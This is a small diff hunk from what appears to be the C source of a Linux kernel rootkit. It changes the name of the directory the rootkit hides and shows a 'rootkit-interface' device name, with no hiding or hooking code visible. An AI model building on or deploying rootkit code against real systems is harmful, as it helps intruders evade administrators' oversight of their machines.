@@ -16,7 +16,7 @@
 #include <linux/dirent.h>
 
 #define DEVICE_NAME "rootkit-interface"
-#define HIDDEN_DIR ".rtkt"
+#define HIDDEN_DIR "rootkit"
 #define TEST_MSG "Inserting Rootkit"
 #define MSG_BUF_LEN 100
 
